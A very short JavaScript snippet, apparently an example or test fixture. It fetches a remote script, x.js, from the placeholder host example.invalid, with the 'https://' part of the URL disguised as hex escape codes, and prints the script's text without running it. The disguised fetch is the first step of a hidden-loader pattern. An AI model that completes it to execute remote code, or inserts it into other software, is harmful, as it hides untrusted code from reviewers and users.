async function run(){
 let payload=await fetch("\x68\x74\x74\x70\x73\x3a\x2f\x2fexample.invalid/x.js").then((response)=>response.text());
 console.log(payload);
}
run();
